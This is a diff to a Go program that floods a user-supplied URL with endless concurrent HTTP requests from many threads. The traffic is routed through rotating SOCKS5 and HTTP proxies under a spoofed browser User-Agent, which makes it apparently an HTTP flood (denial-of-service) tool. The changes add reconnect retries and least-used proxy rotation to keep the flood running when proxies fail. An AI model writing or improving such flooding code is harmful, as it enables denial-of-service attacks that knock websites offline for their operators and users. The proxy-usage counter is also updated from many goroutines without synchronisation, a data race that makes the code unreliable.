@@ -4,12 +4,14 @@ import (
 	"bufio"
 	"fmt"
 	"io/ioutil"
+	"net"
 	"net/http"
 	"net/url"
 	"os"
 	"strconv"
 	"strings"
 	"sync"
+	"time"
 
 	"golang.org/x/net/proxy"
 )
@@ -21,8 +23,8 @@ func main() {
 	method = strings.ToUpper(strings.TrimSpace(method))
 
 	fmt.Print("Enter URL: ")
-	url, _ := reader.ReadString('\n')
-	url = strings.TrimSpace(url)
+	requestUrl, _ := reader.ReadString('\n')
+	requestUrl = strings.TrimSpace(requestUrl)
 
 	fmt.Print("Enter number of threads: ")
 	threadBytes, _, _ := reader.ReadLine()
@@ -48,12 +50,15 @@ func main() {
 	var wg sync.WaitGroup
 	wg.Add(numThreads)
 
+	proxyUsage := make([]int, len(proxies))
+
 	for i := 0; i < numThreads; i++ {
 		go func(i int) {
 			defer wg.Done()
 
 			for {
-				proxyStr := proxies[i%len(proxies)]
+				proxyIndex := i % len(proxies)
+				proxyStr := proxies[proxyIndex]
 
 				var dialFunc func(network, addr string) (c net.Conn, err error)
 				if i < len(socks5Proxies) { // This is a SOCKS5 proxy
@@ -70,16 +75,32 @@ func main() {
 				httpTransport := &http.Transport{Dial: dialFunc}
 				client := &http.Client{Transport: httpTransport}
 
-				req, _ := http.NewRequest(method, url, nil)
+				req, _ := http.NewRequest(method, requestUrl, nil)
 				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537")
 
 				_, err := client.Do(req)
 				if err != nil {
 					fmt.Printf("Proxy %s disconnected, error: %s\n", proxyStr, err)
-					// Change to a different proxy
-					proxyStr = proxies[(i+1)%len(proxies)]
-					continue
+					// Try to reconnect to the same proxy
+					time.Sleep(2 * time.Second)
+					_, err := client.Do(req)
+					if err != nil {
+						fmt.Printf("Reconnection to proxy %s failed, error: %s\n", proxyStr, err)
+						// Change to a different proxy
+						minUsage := proxyUsage[0]
+						minIndex := 0
+						for i, usage := range proxyUsage {
+							if usage < minUsage {
+								minUsage = usage
+								minIndex = i
+							}
+						}
+						proxyIndex = minIndex
+						proxyStr = proxies[proxyIndex]
+						fmt.Printf("Switching to a new proxy: %s\n", proxyStr)
+					}
 				}
+				proxyUsage[proxyIndex]++
 			}
 		}(i)
 	}
